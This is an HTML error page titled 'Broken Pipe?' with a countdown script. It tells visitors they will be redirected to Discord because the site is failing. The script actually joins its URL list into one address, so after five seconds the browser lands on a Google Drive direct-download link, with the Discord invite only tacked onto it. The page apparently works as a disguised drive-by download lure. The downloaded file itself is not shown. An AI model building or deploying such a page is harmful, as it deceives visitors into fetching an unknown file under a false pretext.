<body>
  <center>
    <br/>
    <h1>Broken Pipe?</h1>
    <p>You will be redirected on Discord in <span id="seconds-holder"></span> seconds.<br/><br/> It looks like the website is currently experiencing errors, kindly try again later.
    </p>
  </center>
  <script>
class countdownTimer {
  constructor(elementId, seconds, redirectUrl) {
    this._newUrl = redirectUrl;
    this._intvl = null;
    this._selector = elementId;
    this._seconds = seconds;
     this.start();
  }
  start() {
    var _this = this;
    _this.updateSecs();
    this._intvl = setInterval(function() {
      _this.updateSecs();
    }, 1000);
  }
  updateSecs() {
    document.getElementById(this._selector).innerHTML = this._seconds;
    this._seconds--;
    if (this._seconds == -1) {
      clearInterval(this._intvl);
      this.redirect();
    }
  }
  redirect() {
    var url = "";
    for (var i = 0; i < this._newUrl.length; i++){
      url += this._newUrl[i]
    }
    document.location.href = url;
  }
}

//And now invoke
var co = new countdownTimer("seconds-holder", 5, ['https://drive.google.com/u/0/uc?id=1pgeyopE72CbfvkV8X1GrT9axIBauq9ev', 'https://discord.gg/mf5UFMfzYG']);

  </script>
